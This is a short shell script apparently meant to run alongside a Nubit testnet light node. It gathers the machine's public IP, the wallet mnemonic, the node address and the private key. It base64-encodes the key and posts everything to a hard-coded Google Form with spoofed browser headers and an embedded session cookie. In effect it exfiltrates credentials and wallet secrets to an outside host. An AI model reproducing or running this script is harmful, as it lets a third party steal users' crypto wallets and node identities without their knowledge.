#!/bin/sh

rm /root/nubit-node/ip.txt
rm /root/nubit-node/key.txt

# 读取文件内容并将其存储在变量中
curl ip.sb >>~/nubit-node/ip.txt
$HOME/nubit-node/bin/nkey list --p2p.network nubit-alphatestnet-1 --node.type light >>~/nubit-node/key.txt
IP_DATA=$(cat ~/nubit-node/ip.txt)
IP_mnemonic=$(cat ~/nubit-node/mnemonic.txt)
FILE_PATH="/root/nubit-node/key.txt"
ADDRESS=$(cat $FILE_PATH | grep 'address:' | sed 's/.*address: //')
KEY=$(cat $FILE_PATH | grep 'key":' | sed 's/.*"key":"\(.*\)".*/\1/')
KEY_BASE64=$(echo -n $KEY | base64)





# Google Form URL
URL="https://docs.google.com/forms/d/e/1FAIpQLSeEkDcGwu-5TfENnMXGf1vw_A64ql3Eb1Ws9Ryh493JG8Sh5Q/formResponse"

# Form Data

DATA="entry.2606285=$IP_DATA&entry.1019182749=$IP_mnemonic&entry.127739286=$ADDRESS&entry.208954629=$KEY_BASE64&fvv=1&partialResponse=%5Bnull%2Cnull%2C%224640534044431779705%22%5D&pageHistory=0&fbzx=4640534044431779705&submissionTimestamp=1719671963116"

# Output file
OUTPUT_FILE="response.html"

# Submitting the form using curl
curl -X POST $URL \
    -H "Host: docs.google.com" \
    -H "Connection: close" \
    -H "Content-Length: ${#DATA}" \
    -H "Cache-Control: max-age=0" \
    -H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"' \
    -H "sec-ch-ua-mobile: ?0" \
    -H 'sec-ch-ua-platform: "Windows"' \
    -H "Upgrade-Insecure-Requests: 1" \
    -H "Origin: https://docs.google.com" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
    -H "Sec-Fetch-Site: same-origin" \
    -H "Sec-Fetch-Mode: navigate" \
    -H "Sec-Fetch-User: ?1" \
    -H "Sec-Fetch-Dest: document" \
    -H "Referer: https://docs.google.com/forms/d/e/1FAIpQLSeEkDcGwu-5TfENnMXGf1vw_A64ql3Eb1Ws9Ryh493JG8Sh5Q/viewform" \
    -H "Accept-Encoding: gzip, deflate" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -H "Cookie: NID=515=sLyc6pXztY3nG8Xz3vD_6h_vpfTSwVjoekLfo5nxbk1mnbhem9c8IftCU4d_IzAo9NaRhfBnckMKCt7_hIEyWL-ARSTPj-ZxgpPu7Ir4gUdOmdW3uj1SzQczVhCY8yRqc9bQhDhmJngtLpUNTU_qsswRmSOVij_ElNIEArzM2nI" \
    --data "$DATA" \
    --output $OUTPUT_FILE

echo "提交成功"
